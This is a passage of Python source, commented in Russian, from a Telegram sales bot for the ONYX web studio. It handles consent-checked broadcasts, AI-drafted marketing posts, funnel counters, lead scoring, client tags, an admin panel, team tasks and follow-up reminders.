        r = _redis("LRANGE", "onyx:broadcasts_pending", "0", "-1") or []
        return [int(x) for x in r if str(x).isdigit()]
    return list(_MEM.get("_bc_pending", []))


def bc_pending_remove(bid):
    if KV_URL:
        _redis("LREM", "onyx:broadcasts_pending", "0", str(bid))
    else:
        lst = _MEM.get("_bc_pending", [])
        if bid in lst:
            lst.remove(bid)


BC_BATCH = int(os.environ.get("BROADCAST_BATCH", "20") or 20)  # за один проход


def bc_send_batch(bid, limit=None):
    """Отправить очередную порцию. Возвращает (отправлено, осталось).
    Лимиты Telegram: пауза между сообщениями, остаток дожимается в cron."""
    b = bc_get(bid)
    if not b or b.get("status") == "done":
        return 0, 0
    limit = limit or BC_BATCH
    queue = list(b.get("queue") or [])
    batch, rest = queue[:limit], queue[limit:]
    sent = failed = 0
    unsub_kb = {"inline_keyboard": [[{"text": "🔕 Отписаться", "callback_data": "ct:off"}]]}
    for uid in batch:
        s = csub_get(uid)
        # повторная проверка на момент отправки: вдруг отписался
        if not s or s.get("status") != "active" or b["topic"] not in (s.get("topics") or []):
            continue
        # ст. 18 ФЗ «О рекламе» + ст. 10.1 152-ФЗ: рекламу шлём только по отдельному
        # согласию. Сервисные уведомления по заказу идут отдельным путём (safe_send).
        if not has_consent(uid, "marketing"):
            continue
        try:
            send(uid, b["text"], unsub_kb)
            sent += 1
            s["last_sent_at"] = now_str()
            csub_save(s, to_sheet=False)
        except Exception as e:
            failed += 1
            print("broadcast send err", uid, e)
        time.sleep(0.05)  # ~20 сообщений/сек - в пределах лимитов Telegram
    b["queue"] = rest
    b["sent_count"] = b.get("sent_count", 0) + sent
    b["failed_count"] = b.get("failed_count", 0) + failed
    b["status"] = "done" if not rest else "sending"
    bc_save(b, to_sheet=not rest)
    if rest:
        if bid not in bc_pending_all():
            bc_pending_add(bid)
    else:
        bc_pending_remove(bid)
    return sent, len(rest)


def run_pending_broadcasts():
    """Cron: дожать рассылки, которые не влезли в один запрос."""
    n = 0
    for bid in bc_pending_all():
        sent, _rest = bc_send_batch(bid)
        n += sent
    return n


def ai_draft_post(topic):
    """Черновик поста по теме. Без AI_API_KEY - готовый шаблон (не выдумывает фактов)."""
    full = TOPIC_FULL.get(topic, topic)
    if not AI_API_KEY:
        return (f"<b>Кейс ONYX: как современный сайт помогает бизнесу получать больше заявок</b>\n\n"
                "Многие клиенты принимают решение о покупке ещё до звонка - по сайту компании. "
                "Если сайт выглядит устаревшим или непонятным, бизнес теряет обращения.\n\n"
                "ONYX помогает компаниям запускать современные сайты без лишней сложности "
                f"и с понятной структурой под заявки.\n\n<i>(Тема: {full}. "
                "Черновик-шаблон - задайте AI_API_KEY для генерации.)</i>")
    prompt = (
        "Ты - контент-маркетолог веб-студии ONYX (делаем сайты бизнесу: разработка 0 ₽, "
        "клиент платит за запуск и доп. опции, оплата по счёту).\n"
        f"Напиши короткий полезный пост для Telegram-рассылки на тему: {full}.\n"
        "Требования: 3-5 абзацев, простым языком для владельца малого бизнеса, "
        "без обещаний и гарантий роста, без выдуманных цифр и статистики. "
        "В конце - мягкое упоминание ONYX. Только текст поста, без заголовков-служебок."
    )
    try:
        if "openai" in AI_API_URL or "/chat/completions" in AI_API_URL:
            payload = {"model": AI_MODEL, "max_tokens": 700,
                       "messages": [{"role": "user", "content": prompt}]}
            headers = {"Content-Type": "application/json",
                       "Authorization": f"Bearer {AI_API_KEY}"}
        else:
            payload = {"model": AI_MODEL, "max_tokens": 700,
                       "messages": [{"role": "user", "content": prompt}]}
            headers = {"Content-Type": "application/json", "x-api-key": AI_API_KEY,
                       "anthropic-version": "2023-06-01"}
        req = urllib.request.Request(AI_API_URL, data=json.dumps(payload).encode("utf-8"),
                                     headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=25) as r:
            res = json.load(r)
        if res.get("content"):
            return "".join(x.get("text", "") for x in res["content"] if x.get("type") == "text").strip()
        if res.get("choices"):
            return (res["choices"][0].get("message") or {}).get("content", "").strip()
    except Exception as e:
        print("AI draft err:", e)
    return f"Черновик по теме «{full}» - не удалось сгенерировать, напишите текст вручную."


def bc_topic_kb(action):
    rows = [[{"text": TOPICS[k], "callback_data": f"bc:{action}:{k}"}] for k in TOPICS]
    return {"inline_keyboard": rows}


def bc_preview(chat_id, uid, topic, text):
    cnt = len(topic_subscribers(topic))
    state_set(uid, {"flow": "bc_confirm", "topic": topic, "text": text})
    send(chat_id, f"👀 <b>Предпросмотр рассылки</b>\n"
                  f"Тема: {TOPICS.get(topic, topic)}\n"
                  f"Получателей: <b>{cnt}</b>\n\n"
                  f"- - -\n{text}\n- - -",
         {"inline_keyboard": [
             [{"text": f"✅ Отправить ({cnt})", "callback_data": "bc:send"}],
             [{"text": "✍️ Переписать", "callback_data": f"bc:new:{topic}"},
              {"text": "❌ Отмена", "callback_data": "bc:cancel"}],
         ]})


# ============================================================================
#  ЭТАП 11: ОПЕРАЦИОННЫЙ ЦЕНТР ONYX - Events, Leads, Tags, Админ-панель
# ============================================================================
DAY = 60 * 60 * 24


def _ts():
    return int(time.time())


def _today_key(ts=None):
    return time.strftime("%Y%m%d", time.localtime(ts or _ts()))


def _day_start_ts(offset_days=0):
    lt = time.localtime()
    midnight = time.mktime((lt.tm_year, lt.tm_mon, lt.tm_mday, 0, 0, 0, 0, 0, -1))
    return int(midnight) - offset_days * DAY


# ------------------------- Счётчики (для статистики/воронки) -------------------------
def bump(metric, n=1):
    """Инкремент счётчика: всевременного и на сегодня."""
    if KV_URL:
        k = f"onyx:cnt:{metric}:{_today_key()}"
        _redis_many([("INCRBY", f"onyx:cnt:{metric}", str(n)),
                     ("INCRBY", k, str(n)),
                     ("EXPIRE", k, str(DAY * 40))])
    else:
        c = _MEM.setdefault("_cnt", {})
        c[metric] = c.get(metric, 0) + n
        c[f"{metric}:{_today_key()}"] = c.get(f"{metric}:{_today_key()}", 0) + n


def get_cnt(metric, day=None):
    key = f"onyx:cnt:{metric}" + (f":{day}" if day else "")
    if KV_URL:
        v = _redis("GET", key)
        return int(v) if v else 0
    return _MEM.get("_cnt", {}).get(metric if not day else f"{metric}:{day}", 0)


def cnt_last_days(metric, days):
    total = 0
    for i in range(days):
        total += get_cnt(metric, _today_key(_day_start_ts(i)))
    return total


# ------------------------- Events (аналитика воронки) -------------------------
EVENT_SHEET_ON = os.environ.get("EVENTS_TO_SHEET", "") == "1"
# event_type -> счётчик воронки (какие события агрегируем как метрики)
FUNNEL_METRICS = {
    "start": "ev_start", "tariffs_open": "ev_tariffs", "questionnaire_start": "ev_q_start",
    "questionnaire_done": "ev_q_done", "service_add": "ev_svc_add", "cart_created": "ev_cart",
    "payment_start": "ev_pay_start", "paid": "ev_paid", "invoice_requested": "ev_invoice",
    "audit_done": "ev_audit", "offer_requested": "ev_offer", "cabinet_open": "ev_cabinet",
    "myorder_open": "ev_myorder", "urgent": "ev_urgent", "review_left": "ev_review",
    "partner_apply": "ev_partner", "subscribed": "ev_sub_on", "unsubscribed": "ev_sub_off",
    # --- воронка вокруг конвертера ---
    "entry_site": "ev_entry_site", "entry_nosite": "ev_entry_nosite",
    "entry_manager": "ev_entry_manager", "consult_offered": "ev_cons_offer",
    "consult_scheduled": "ev_cons_set", "consult_done": "ev_cons_done",
    "project_start": "ev_proj", "model_ok": "ev_model", "package_offered": "ev_pkg",
    "qual_started": "ev_qual_start", "qualified": "ev_qualified",
    "materials_received": "ev_materials",
}


# Порядок этапов для /funnel - сверху вниз, как их проходит клиент.
FUNNEL_VIEW = [
    ("Зашли в бота", "ev_start"),
    ("Выбрали ветку", "ev_entry_branch"),
    ("Узнали про консультацию", "ev_cons_offer"),
    ("Записались", "ev_cons_set"),
    ("Консультация прошла", "ev_cons_done"),
    ("Начали оформление", "ev_proj"),
    ("Приняли условия работы", "ev_model"),
    ("Начали анкету", "ev_q_start"),
    ("Закончили анкету", "ev_q_done"),
    ("Увидели пакет", "ev_pkg"),
    ("Пошли на квалификацию", "ev_qual_start"),
    ("Квалифицированы", "ev_qualified"),
    ("Прислали материалы", "ev_materials"),
    ("Оплатили запуск", "ev_paid"),
]


def log_event(uid, event_type, data=""):
    """Логирует действие пользователя: счётчик воронки (+ Sheets по флагу)."""
    try:
        metric = FUNNEL_METRICS.get(event_type)
        if metric:
            bump(metric)
        if event_type.startswith("entry_"):
            bump("ev_entry_branch")   # сводный счётчик: выбрал любую из трёх веток
        if EVENT_SHEET_ON:
            eid = _redis("INCR", "onyx:event_seq") if KV_URL else _MEM.get("_event_seq", 0) + 1
            if not KV_URL:
                _MEM["_event_seq"] = eid
            sheet_post("Events", {
                "event_id": eid, "telegram_id": uid, "event_type": event_type,
                "event_data": data if isinstance(data, str) else json.dumps(data, ensure_ascii=False),
                "created_at": now_str(),
            })
    except Exception as e:
        print("log_event err", e)


def funnel_stats():
    return {
        "start": get_cnt("ev_start"), "q_start": get_cnt("ev_q_start"),
        "q_done": get_cnt("ev_q_done"), "tariffs": get_cnt("ev_tariffs"),
        "cart": get_cnt("ev_cart"), "paid": get_cnt("ev_paid"),
        "audit": get_cnt("ev_audit"), "offer": get_cnt("ev_offer"),
    }


def _pct(a, b):
    return f"{round(a / b * 100)}%" if b else "-"


def funnel_text():
    f = funnel_stats()
    return (
        "📊 <b>Воронка ONYX</b>\n\n"
        f"/start: <b>{f['start']}</b>\n"
        f"Начали анкету: <b>{f['q_start']}</b>\n"
        f"Заполнили анкету: <b>{f['q_done']}</b>\n"
        f"Открыли тарифы: <b>{f['tariffs']}</b>\n"
        f"Создали заказ: <b>{f['cart']}</b>\n"
        f"Оплатили: <b>{f['paid']}</b>\n\n"
        f"Конверсия /start → анкета: <b>{_pct(f['q_start'], f['start'])}</b>\n"
        f"Анкета → заполнена: <b>{_pct(f['q_done'], f['q_start'])}</b>\n"
        f"Анкета → заказ: <b>{_pct(f['cart'], f['q_done'])}</b>\n"
        f"Заказ → оплата: <b>{_pct(f['paid'], f['cart'])}</b>\n"
        f"Аудит → заявка: <b>{_pct(f['offer'], f['audit'])}</b>"
    )


# ------------------------- Leads (лиды и температура) -------------------------
LEAD_STATUSES = ["new", "audit_requested", "audit_sent", "questionnaire_started",
                 "questionnaire_completed", "cart_created", "payment_pending",
                 "invoice_requested", "paid", "lost", "converted"]


def leads_index_add(uid):
    if KV_URL:
        _redis("SADD", "onyx:leads_all", str(uid))
    else:
        _MEM.setdefault("_leads_all", set()).add(uid)


def all_lead_ids():
    if KV_URL:
        r = _redis("SMEMBERS", "onyx:leads_all") or []
        return [int(x) for x in r if str(x).isdigit()]
    return list(_MEM.get("_leads_all", set()))


def lead_get(uid):
    return _get(f"onyx:lead:{uid}")


def lead_save(l):
    l["updated_at"] = now_str()
    _set(f"onyx:lead:{l['telegram_id']}", l, ttl=YEAR)
    sheet_lead(l)
    return l


def compute_temperature(uid, lead):
    """hot / warm / cold по сигналам клиента."""
    p = user_get(uid) or {}
    status = lead.get("lead_status", "new")
    cart = cart_get(uid)
    hot_signals = (
        p.get("questionnaire_status") == "filled" or bool(cart) or
        status in ("cart_created", "payment_pending", "invoice_requested") or
        lead.get("offer_requested") or (lead.get("tariffs_views", 0) >= 3)
    )
    if hot_signals:
        return "hot"
    warm_signals = (
        p.get("audit_done") or lead.get("tariffs_views", 0) >= 1 or
        status in ("audit_sent", "audit_requested", "questionnaire_started")
    )
    if warm_signals:
        return "warm"
    return "cold"


def lead_touch(uid, username=None, name=None, source=None, status=None,
               action=None, inc_tariffs=False, offer=False):
    """Создать/обновить лид и пересчитать температуру."""
    l = lead_get(uid)
    if not l:
        l = {"lead_id": uid, "telegram_id": uid, "username": username or "",
             "name": name or "", "source": source or "telegram",
             "lead_status": "new", "lead_temperature": "cold",
             "last_action": action or "start", "next_follow_up_at": "",
             "follow_up_count": 0, "assigned_manager": "", "comment": "",
             "tariffs_views": 0, "followups_off": False,
             "created_at": now_str(), "updated_at": now_str()}
        leads_index_add(uid)
    if username:
        l["username"] = username
    if name and not l.get("name"):
        l["name"] = name
    if source and l.get("source") in (None, "", "telegram"):
        l["source"] = source
    if status:
        # не откатываем назад конверсию
        if not (l.get("lead_status") in ("converted", "paid") and status not in ("converted", "paid")):
            l["lead_status"] = status
    if action:
        l["last_action"] = action
        l["last_action_at"] = now_str()
        l["last_action_ts"] = _ts()
    if inc_tariffs:
        l["tariffs_views"] = l.get("tariffs_views", 0) + 1
    if offer:
        l["offer_requested"] = True
    l["lead_temperature"] = compute_temperature(uid, l)
    return lead_save(l)


def sheet_lead(l):
    sheet_post("Leads", {
        "lead_id": l.get("lead_id", ""), "telegram_id": l.get("telegram_id", ""),
        "username": l.get("username", ""), "name": l.get("name", ""),
        "source": l.get("source", ""), "lead_status": l.get("lead_status", ""),
        "lead_temperature": l.get("lead_temperature", ""), "last_action": l.get("last_action", ""),
        "next_follow_up_at": l.get("next_follow_up_at", ""), "follow_up_count": l.get("follow_up_count", 0),
        "assigned_manager": l.get("assigned_manager", ""), "comment": l.get("comment", ""),
        "created_at": l.get("created_at", ""), "updated_at": l.get("updated_at", ""),
    })


def leads_by_temperature(temp):
    out = []
    for uid in all_lead_ids():
        l = lead_get(uid)
        if l and l.get("lead_temperature") == temp:
            out.append(l)
    return out


def leads_to_followup():
    """Клиенты, которых стоит дожать: hot/warm, не оплатившие, дожимы не отключены."""
    out = []
    for uid in all_lead_ids():
        l = lead_get(uid)
        if not l or l.get("followups_off"):
            continue
        if l.get("lead_status") in ("paid", "converted", "lost"):
            continue
        if l.get("lead_temperature") in ("hot", "warm"):
            out.append(l)
    out.sort(key=lambda x: 0 if x.get("lead_temperature") == "hot" else 1)
    return out


# ------------------------- Теги клиентов -------------------------
def add_tag(uid, tag):
    p = user_get(uid) or {}
    tags = p.get("tags") or []
    if tag not in tags:
        tags.append(tag)
        p["tags"] = tags
        p["updated"] = now_str()
        user_save(uid, p)


def remove_tag(uid, tag):
    p = user_get(uid) or {}
    tags = p.get("tags") or []
    if tag in tags:
        tags.remove(tag)
        p["tags"] = tags
        user_save(uid, p)


def recompute_tags(uid):
    """Пересобрать автоматические теги клиента из его профиля/заказов/лида."""
    p = user_get(uid)
    if not p:
        return
    tags = set(t for t in (p.get("tags") or []) if t not in AUTO_TAGS)
    l = lead_get(uid) or {}
    purchased = set(p.get("purchased_services") or [])
    orders_paid = any((order_get(o) or {}).get("payment_status") == "paid"
                      for o in p.get("orders", []))
    if p.get("client_status") == "new" and not p.get("orders"):
        tags.add("new_user")
    if p.get("audit_done"):
        tags.add("audit_done")
    if p.get("website"):
        tags.add("has_website")
    elif p.get("questionnaire_status") == "filled":
        tags.add("no_website")
    if orders_paid:
        tags.add("paid_client")
    if "design" in purchased:
        tags.add("design_buyer")
    if "crm" in purchased:
        tags.add("crm_buyer")
    if l.get("lead_temperature") == "hot" and not orders_paid:
        tags.add("hot_lead")
    if l.get("lead_temperature") in ("hot", "warm") and not orders_paid and not l.get("followups_off"):
        tags.add("needs_followup")
    p["tags"] = sorted(tags)
    user_save(uid, p)
    return p["tags"]


AUTO_TAGS = {"new_user", "audit_done", "has_website", "no_website", "hot_lead",
             "paid_client", "needs_followup", "design_buyer", "crm_buyer"}
TAG_LABELS = {
    "new_user": "🆕 Новый", "audit_done": "🔍 Прошёл аудит", "has_website": "🌐 Есть сайт",
    "no_website": "🚫 Нет сайта", "hot_lead": "🔥 Горячий лид", "paid_client": "💰 Оплатил",
    "needs_followup": "📞 Нужен дожим", "design_buyer": "🎨 Купил дизайн",
    "crm_buyer": "⚙️ Купил CRM", "partner_candidate": "🤝 Кандидат в партнёры",
    "domain_help_needed": "🔤 Нужна помощь с доменом",
}


def clients_by_tag(tag):
    out = []
    for uid in all_lead_ids():
        p = user_get(uid)
        if p and tag in (p.get("tags") or []):
            out.append((uid, p))
    return out


# ------------------------- Админ-панель /admin -------------------------
def admin_panel_kb():
    return {"inline_keyboard": [
        [{"text": "👥 Клиенты", "callback_data": "adm:clients"},
         {"text": "📦 Заказы", "callback_data": "adm:orders"}],
        [{"text": "💳 Оплаты / счета", "callback_data": "adm:payments"},
         {"text": "🔍 Аудиты", "callback_data": "adm:audits"}],
        [{"text": "🏭 Производство", "callback_data": "adm:prod"}],
        [{"text": "🌐 Домены", "callback_data": "adm:domains"},
         {"text": "✅ Задачи", "callback_data": "adm:tasks"}],
        [{"text": "🤝 Партнёры", "callback_data": "adm:partners"},
         {"text": "📣 Рассылки", "callback_data": "adm:broadcasts"}],
        [{"text": "📊 Статистика", "callback_data": "adm:stats"},
         {"text": "📈 Воронка", "callback_data": "adm:funnel"}],
        [{"text": "🐞 Ошибки системы", "callback_data": "adm:errors"}],
    ]}


def admin_stats_text():
    today = _today_key()
    revenue = get_cnt("revenue")
    revenue_today = get_cnt("revenue", today)
    hot = len(leads_by_temperature("hot"))
    followup = len(leads_to_followup())
    abandoned_carts = sum(1 for uid in all_lead_ids()
                          if cart_get(uid) and (lead_get(uid) or {}).get("lead_status") not in ("paid", "converted"))
    unfinished_q = sum(1 for uid in all_lead_ids()
                       if (lead_get(uid) or {}).get("lead_status") == "questionnaire_started")
    return (
        "📊 <b>Статистика ONYX</b>\n\n"
        "<b>Сегодня:</b>\n"
        f"Новых пользователей: {get_cnt('ev_start', today)}\n"
        f"Анкет заполнено: {get_cnt('ev_q_done', today)}\n"
        f"Заказов создано: {get_cnt('ev_cart', today)}\n"
        f"Оплачено: {get_cnt('ev_paid', today)}\n"
        f"Выручка: {fmt_amount(revenue_today)}\n\n"
        "<b>За неделю:</b>\n"
        f"Новых пользователей: {cnt_last_days('ev_start', 7)}\n"
        f"Оплат: {cnt_last_days('ev_paid', 7)}\n\n"
        "<b>Всего:</b>\n"
        f"Выручка: {fmt_amount(revenue)}\n"
        f"Горячих лидов: {hot}\n\n"
        "<b>Проблемные зоны:</b>\n"
        f"Незавершённых анкет: {unfinished_q}\n"
        f"Брошенных корзин: {abandoned_carts}\n"
        f"Клиентов на дожим: {followup}"
    )


def admin_stats_kb():
    return {"inline_keyboard": [
        [{"text": "🔄 Обновить", "callback_data": "adm:stats"}],
        [{"text": "📞 Клиенты для дожима", "callback_data": "adm:followup"}],
        [{"text": "⬅️ Назад", "callback_data": "adm:home"}],
    ]}


def admin_tags_kb():
    return {"inline_keyboard": [
        [{"text": "🔥 Горячие лиды", "callback_data": "adm:tag:hot_lead"}],
        [{"text": "📞 Нужен дожим", "callback_data": "adm:tag:needs_followup"}],
        [{"text": "🎨 Купили дизайн", "callback_data": "adm:tag:design_buyer"}],
        [{"text": "🔍 Прошли аудит", "callback_data": "adm:tag:audit_done"}],
        [{"text": "💰 Оплатившие", "callback_data": "adm:tag:paid_client"}],
        [{"text": "⬅️ Назад", "callback_data": "adm:home"}],
    ]}


def _lead_line(l):
    temp = {"hot": "🔥", "warm": "🌤", "cold": "❄️"}.get(l.get("lead_temperature"), "•")
    uname = f"@{l['username']}" if l.get("username") else f"id {l['telegram_id']}"
    return f"{temp} {uname} · {l.get('name', '-')} · {l.get('lead_status', '')}"


def admin_followup_text():
    leads = leads_to_followup()[:20]
    if not leads:
        return "📞 <b>Клиенты для дожима</b>\n\nПока никого - все горячие лиды обработаны 👍"
    lines = ["📞 <b>Клиенты для дожима</b>\n"]
    for l in leads:
        lines.append(_lead_line(l))
    return "\n".join(lines)


def admin_tag_list_text(tag):
    rows = clients_by_tag(tag)[:25]
    label = TAG_LABELS.get(tag, tag)
    if not rows:
        return f"{label}\n\nПока никого."
    lines = [f"<b>{label}</b> ({len(rows)})\n"]
    for uid, p in rows:
        uname = f"@{p['username']}" if p.get("username") else f"id {uid}"
        lines.append(f"• {uname} · {p.get('name', '-')} · {p.get('niche', '-')}")
    return "\n".join(lines)


def open_admin_panel(chat_id, mid=None):
    edit_or_send(chat_id, mid, "🛠 <b>Админ-панель ONYX</b>\nВыберите раздел:", admin_panel_kb())


# ============================================================================
#  ЭТАП 12: ЗАДАЧИ КОМАНДЫ (Tasks)
# ============================================================================
TASK_STATUS_RU = {"new": "🆕 Новая", "in_progress": "🔧 В работе",
                  "waiting_client": "⏳ Ждём клиента", "done": "✅ Выполнена", "cancelled": "❌ Отменена"}
PRIORITY_RU = {"low": "низкий", "normal": "обычный", "high": "высокий", "urgent": "🔥 срочный"}


def _slug(s):
    return re.sub(r"[^a-zа-я0-9]+", "_", (s or "").lower())[:40]


def tasks_index_add(tid):
    if KV_URL:
        _redis("RPUSH", "onyx:tasks_all", str(tid))
    else:
        _MEM.setdefault("_tasks_all", []).append(tid)


def all_task_ids():
    if KV_URL:
        r = _redis("LRANGE", "onyx:tasks_all", "-200", "-1") or []
        return [int(x) for x in r if str(x).isdigit()]
    return _MEM.get("_tasks_all", [])


def task_get(tid):
    return _get(f"onyx:task:{tid}")


def task_save(t):
    t["updated_at"] = now_str()
    _set(f"onyx:task:{t['task_id']}", t, ttl=YEAR)
    sheet_task(t)
    return t


def sheet_task(t):
    sheet_post("Tasks", {
        "task_id": t.get("task_id", ""), "related_type": t.get("related_type", ""),
        "related_id": t.get("related_id", ""), "telegram_id": t.get("telegram_id", ""),
        "order_id": t.get("order_id", ""), "title": t.get("title", ""),
        "description": t.get("description", ""), "task_status": t.get("task_status", ""),
        "priority": t.get("priority", ""), "assigned_to": t.get("assigned_to", ""),
        "due_date": t.get("due_date", ""), "created_by": t.get("created_by", ""),
        "created_at": t.get("created_at", ""), "updated_at": t.get("updated_at", ""),
    })


def create_task(related_type, related_id, title, description="", telegram_id="",
                order_id="", priority="normal", notify=True):
    """Создать задачу с защитой от дублей (одна открытая задача на related+title)."""
    dedup_key = f"onyx:task_open:{related_type}:{related_id}:{_slug(title)}"
    existing = _get(dedup_key)
    if existing:
        t = task_get(existing)
        if t and t.get("task_status") not in ("done", "cancelled"):
            return t  # уже есть открытая такая задача
    tid = _redis("INCR", "onyx:task_seq") if KV_URL else (_MEM.get("_task_seq", 0) + 1)
    if not KV_URL:
        _MEM["_task_seq"] = tid
    t = {"task_id": tid, "related_type": related_type, "related_id": str(related_id),
         "telegram_id": telegram_id, "order_id": order_id, "title": title,
         "description": description, "task_status": "new", "priority": priority,
         "assigned_to": "", "due_date": "", "created_by": "system",
         "created_at": now_str(), "updated_at": now_str()}
    tasks_index_add(tid)
    _set(dedup_key, tid, ttl=YEAR)
    t["_dedup"] = dedup_key
    task_save(t)
    if notify:
        pr = "🔥 " if priority == "urgent" else ""
        notify_admins(f"{pr}✅ <b>Новая задача #{tid}</b>\n{title}"
                      + (f"\n{description}" if description else "")
                      + (f"\n👤 клиент id {telegram_id}" if telegram_id else ""))
    return t


def task_close(t, status="done"):
    t["task_status"] = status
    if t.get("_dedup"):
        _del(t["_dedup"])
    task_save(t)


def tasks_by_bucket(bucket):
    out = []
    for tid in all_task_ids():
        t = task_get(tid)
        if not t:
            continue
        st = t.get("task_status")
        if bucket == "new" and st == "new":
            out.append(t)
        elif bucket == "urgent" and st not in ("done", "cancelled") and t.get("priority") == "urgent":
            out.append(t)
        elif bucket == "open" and st not in ("done", "cancelled"):
            out.append(t)
    return out


def admin_tasks_text(bucket="open"):
    tasks = tasks_by_bucket(bucket)[:20]
    title = {"open": "Открытые", "new": "Новые", "urgent": "🔥 Срочные"}.get(bucket, bucket)
    if not tasks:
        return f"✅ <b>Задачи - {title}</b>\n\nПусто 👍", None
    lines = [f"✅ <b>Задачи - {title}</b>\n"]
    rows = []
    for t in tasks:
        lines.append(f"#{t['task_id']} {PRIORITY_RU.get(t.get('priority'), '')} - {t['title']} - {TASK_STATUS_RU.get(t.get('task_status'), '')}")
        rows.append([{"text": f"#{t['task_id']} {t['title'][:24]}", "callback_data": f"task:v:{t['task_id']}"}])
    rows.append([{"text": "⬅️ Назад", "callback_data": "adm:home"}])
    return "\n".join(lines), {"inline_keyboard": rows}


def admin_task_detail(t):
    lines = [f"✅ <b>Задача #{t['task_id']}</b>", "",
             f"<b>{t['title']}</b>",
             t.get("description", "") or "",
             f"Тип: {t.get('related_type', '-')} · Приоритет: {PRIORITY_RU.get(t.get('priority'), '')}",
             f"Статус: {TASK_STATUS_RU.get(t.get('task_status'), '')}"]
    if t.get("telegram_id"):
        lines.append(f"Клиент: id {t['telegram_id']}")
    kb = {"inline_keyboard": [
        [{"text": "🔧 В работу", "callback_data": f"task:s:{t['task_id']}:in_progress"},
         {"text": "✅ Выполнено", "callback_data": f"task:s:{t['task_id']}:done"}],
        [{"text": "⏳ Ждём клиента", "callback_data": f"task:s:{t['task_id']}:waiting_client"},
         {"text": "❌ Отменить", "callback_data": f"task:s:{t['task_id']}:cancelled"}],
        [{"text": "⬅️ К задачам", "callback_data": "adm:tasks"}],
    ]}
    return "\n".join(x for x in lines if x), kb


# ============================================================================
#  ЭТАП 13: АВТОДОЖИМЫ (FollowUps)
# ============================================================================
FOLLOWUP_DEFS = {
    "questionnaire_abandoned": {
        "delay": 24 * 3600,
        "text": "Вы начали заполнять анкету для сайта, но не завершили её. "
                "Можем продолжить с того места, где остановились.",
        "kb": {"inline_keyboard": [
            [{"text": "📝 Продолжить анкету", "callback_data": "brief:start"}],
            [{"text": "💬 Задать вопрос", "callback_data": "fu:support"}],
            [{"text": "🚫 Неактуально", "callback_data": "fu:stop"}]]}},
    "cart_abandoned_1": {
        "delay": 3 * 3600,
        "text": "Вы собрали заказ, но не завершили оплату. Если остались вопросы по услугам "
                "или стоимости - команда ONYX поможет разобраться.",
        "kb": {"inline_keyboard": [
            [{"text": "💳 Перейти к оплате", "callback_data": "cart:open"}],
            [{"text": "💬 Написать в поддержку", "callback_data": "fu:support"}],
            [{"text": "🛒 Изменить корзину", "callback_data": "svc:list"}]]}},
    "cart_abandoned_2": {
        "delay": 24 * 3600,
        "text": "Напоминаем, ваш заказ ONYX всё ещё ожидает оплаты. После оплаты мы сможем "
                "запустить работу над сайтом.",
        "kb": {"inline_keyboard": [
            [{"text": "💳 Перейти к оплате", "callback_data": "cart:open"}],
            [{"text": "💬 Написать в поддержку", "callback_data": "fu:support"}]]}},
    # --- воронка вокруг конвертера: напоминания на каждом этапе ---
    "consult_invite": {
        "delay": 6 * 3600,
        "text": "Вы смотрели материалы по сайту. Хотите, разберём вашу ситуацию лично "
                "и составим персональный план? Это бесплатно и ни к чему не обязывает.",
        "kb": {"inline_keyboard": [
            [{"text": "🎯 Получить персональный план", "callback_data": "cons:offer"}],
            [{"text": "💬 Задать вопрос", "callback_data": "ask:mgr"}]]}},
    "consult_reminder": {
        "delay": 20 * 3600,
        "text": "Напоминаем про консультацию. Если время не подходит - скажите, перенесём.",
        "kb": {"inline_keyboard": [
            [{"text": "✅ Всё в силе", "callback_data": "fu:ok"}],
            [{"text": "🔄 Перенести", "callback_data": "cons:offer"}]]}},
    "anketa_unfinished": {
        "delay": 3 * 3600,
        "text": "Анкета осталась незаконченной - без неё не можем начать сборку. "
                "Там осталось совсем немного.",
        "kb": {"inline_keyboard": [
            [{"text": "▶️ Продолжить анкету", "callback_data": "brief:resume"}],
            [{"text": "💬 Нужна помощь", "callback_data": "ask:mgr"}]]}},
    "materials_missing": {
        "delay": 24 * 3600,
        "text": "Ждём материалы, чтобы запустить сборку: фото, логотип, отзывы. "
                "Чего-то нет - скажите, подскажем чем заменить.",
        "kb": {"inline_keyboard": [
            [{"text": "📤 Загрузить материалы", "callback_data": "up:menu"}],
            [{"text": "🎨 Нет контента - упакуйте", "callback_data": "mat:help"}]]}},
    "changes_reminder": {
        "delay": 24 * 3600,
        "text": "Ждём ваши правки одним сообщением - так внесём их быстрее и все разом.",
        "kb": {"inline_keyboard": [
            [{"text": "✏️ Отправить правки", "callback_data": "myorder:changes"}],
            [{"text": "💬 Задать вопрос", "callback_data": "ask:mgr"}]]}},
    "invoice_reminder": {
        "delay": 24 * 3600,
        "text": "Сайт готов и ждёт запуска. После оплаты подключаем домен, формы "
                "и аналитику - обычно в тот же день.",
        "kb": {"inline_keyboard": [
            [{"text": "🧾 Реквизиты для оплаты", "callback_data": "cart:open"}],
            [{"text": "💬 Задать вопрос", "callback_data": "ask:mgr"}]]}},
    "audit_no_order": {
        "delay": 24 * 3600,
        "text": "Вчера мы разобрали ваш сайт. Если остались вопросы по находкам - "
                "разработчик разберёт их с вами лично, бесплатно и без обязательств.",
        "kb": {"inline_keyboard": [
            [{"text": "🎯 Получить персональный план сайта", "callback_data": "cons:offer"}],
            [{"text": "🚀 Начать анкету", "callback_data": "brief:start"}],
            [{"text": "💬 Написать в поддержку", "callback_data": "fu:support"}]]}},
    "idle_after_start": {
        "delay": 48 * 3600,
        "text": "Подскажите, что сейчас актуальнее для вашего бизнеса?",
        "kb": {"inline_keyboard": [
            [{"text": "🌐 Нужен новый сайт", "callback_data": "brief:start"}],
            [{"text": "🔧 Улучшить старый сайт", "callback_data": "fu:improve"}],
            [{"text": "🔍 Хочу бесплатный аудит", "callback_data": "fu:audit"}],
            [{"text": "👀 Пока просто изучаю", "callback_data": "fu:browse"}]]}},
}
FU_MARKETING = {"idle_after_start", "audit_no_order"}  # маркетинговые (не слать отписавшимся)
FU_DAILY_LIMIT = 2


def followups_index_add(fid):
    if KV_URL:
        _redis("RPUSH", "onyx:followups_all", str(fid))
    else:
        _MEM.setdefault("_followups_all", []).append(fid)


def all_followup_ids():
    if KV_URL:
        r = _redis("LRANGE", "onyx:followups_all", "-500", "-1") or []
        return [int(x) for x in r if str(x).isdigit()]
    return _MEM.get("_followups_all", [])


def followup_get(fid):
    return _get(f"onyx:followup:{fid}")


def followup_save(f):
    _set(f"onyx:followup:{f['followup_id']}", f, ttl=YEAR)
    return f


def has_active_followup(uid, ftype):
    for fid in all_followup_ids():
        f = followup_get(fid)
        if f and f.get("telegram_id") == uid and f.get("type") == ftype and f.get("status") == "scheduled":
            return True
    return False


def schedule_followup(uid, ftype, username=""):
    """Запланировать дожим, если такого ещё нет в очереди и дожимы не отключены."""
